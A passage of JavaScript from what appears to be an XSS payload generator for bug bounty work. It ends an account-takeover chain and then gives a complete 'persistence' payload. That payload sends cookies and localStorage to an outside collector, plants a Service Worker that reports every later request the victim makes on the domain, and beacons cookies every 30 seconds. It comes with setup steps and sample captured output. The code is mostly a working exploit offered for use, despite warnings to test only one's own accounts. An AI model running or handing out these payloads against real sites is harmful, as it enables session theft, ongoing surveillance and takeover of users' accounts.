          '2. Update /api/account/email to match the target\'s actual email-change endpoint',
          '3. ⚠️ CRITICAL: Only run this on your OWN test account, not real victims',
          '4. Open the crafted URL — watch collector for 3 sequential messages (session → profile → email_change)',
          '5. If step 3 returns 200: you have proven ATO. STOP HERE. Do not proceed on real accounts.',
          '6. Report with: full collector log + crafted URL + endpoint mappings',
        ],
        bountyImpact: {
          severity: 'Critical / P0 — Maximum payout',
          cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H — 9.6',
          cwe: 'CWE-79 + CWE-640 (Weak Password Recovery) + CWE-287',
          title: `Reflected XSS → Full Account Takeover via email change in "${paramName}"`,
          summary: `XSS in "${paramName}" enables a complete account takeover chain: (1) steal victim session, (2) authenticate to account API, (3) change account email, (4) trigger password reset. This grants an attacker complete and permanent control of the victim's account with full lockout of the original owner. This is typically the highest-severity finding in any bug bounty program.`,
        },
        warningNote: '🚨 The email change step MUST only be run on your own test accounts. Never attempt an actual account takeover on real users — doing so converts a legitimate bug report into a criminal act.',
      };
    }

    // ── 👾 PERSISTENCE ────────────────────────────────────────────────────────
    default:
    case 'persistence': {
      const js = `(function(){var COLLECTOR='${COLLECTOR}';var base='${base}';function report(k,v){fetch(COLLECTOR,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:k,data:v,url:location.href,ts:new Date().toISOString()}),mode:'no-cors'});}report('initial_beacon',{cookies:document.cookie,localStorage:JSON.stringify(localStorage)});try{var swCode='self.addEventListener("install",function(e){e.waitUntil(caches.open("xss-persist-v1").then(function(c){return c.add("/");}));});self.addEventListener("fetch",function(e){report("intercept",{url:e.request.url});e.respondWith(fetch(e.request).then(function(r){return r;}));});function report(k,v){fetch("'+COLLECTOR+'",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sw:k,data:v,ts:new Date().toISOString()}),mode:"no-cors"});}';var blob=new Blob([swCode],{type:'application/javascript'});var url=URL.createObjectURL(blob);navigator.serviceWorker.register(url,{scope:'/'}).then(function(reg){report('sw_registered',{scope:reg.scope,active:!!reg.active});}).catch(function(err){report('sw_failed',{error:err.message});});}catch(err){report('sw_error',{error:err.message});}setInterval(function(){report('heartbeat',{cookies:document.cookie,alive:true});},30000);})();`;
      return {
        goalId, goalTitle: goal.title, goalIcon: goal.icon, severity: 'high',
        payload: wrap(context, js),
        collectorPayload: wrap(context, js),
        howItWorks: [
          { icon: '1️⃣', title: 'Immediate beacon', detail: 'Instantly sends cookies + localStorage to your collector — this is your guaranteed capture even if persistence fails.' },
          { icon: '2️⃣', title: 'Service Worker registration', detail: 'Attempts to register a Service Worker with scope "/". If successful, the SW intercepts ALL future HTTP requests from the victim on this domain — even after they close the tab.' },
          { icon: '3️⃣', title: 'SW interception', detail: 'The registered Service Worker reports every intercepted request to your collector — you see every URL the victim visits on the target domain, for as long as the SW lives.' },
          { icon: '4️⃣', title: 'Heartbeat beacon', detail: 'Sends a heartbeat ping every 30 seconds while the tab is open — confirms the victim is still active and provides fresh cookie values.' },
          { icon: '5️⃣', title: 'Persistence impact', detail: 'Service Workers survive tab close and browser restart. They are cleared only when: the browser explicitly unregisters them, or the user clears site data. This is maximum persistence for XSS.' },
        ],
        whatYouReceive: [
          {
            label: 'Persistence chain events (example)',
            content: JSON.stringify([
              { type: 'initial_beacon', data: { cookies: 'session=abc123', localStorage: '{"auth":"eyJ..."}' }, ts: new Date(Date.now() - 5000).toISOString() },
              { type: 'sw_registered', data: { scope: '/', active: true }, ts: new Date(Date.now() - 4000).toISOString() },
              { sw: 'intercept', data: { url: `${base}/api/dashboard` }, ts: new Date(Date.now() - 3000).toISOString() },
              { sw: 'intercept', data: { url: `${base}/api/user/settings` }, ts: new Date(Date.now() - 2000).toISOString() },
              { type: 'heartbeat', data: { cookies: 'session=abc123', alive: true }, ts: new Date().toISOString() },
            ], null, 2),
          },
        ],
        collectorSetup: [
          '1. Requires HTTPS on the target (Service Workers don\'t register on HTTP)',
          '2. Replace YOUR_COLLECTOR_URL with webhook.site or Burp Collaborator',
          '3. Open the crafted URL — check collector for "sw_registered" event',
          '4. Close the tab — the SW persists. Open the target site normally — SW fires',
          '5. For PoC: screenshot "sw_registered" event + subsequent intercept events after tab close',
          '6. To clean up: DevTools → Application → Service Workers → Unregister',
        ],
        bountyImpact: {
          severity: 'High / P2 (Critical if admin victim)',
          cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N — 8.2',
          cwe: 'CWE-79 + CWE-285 (Improper Authorization)',
          title: `Reflected XSS in "${paramName}" allows persistent Service Worker implant surviving session close`,
          summary: `XSS in "${paramName}" can be used to register a Service Worker that persists beyond the XSS page close. The SW intercepts and reports all subsequent HTTP traffic from the victim on the target domain, providing ongoing access to request/response data. This is particularly severe if the victim is an admin or privileged user.`,
        },
        warningNote: 'Clean up any Service Workers you register during testing. To verify cleanup: target site DevTools → Application → Service Workers → confirm empty.',
      };
    }
  }
}
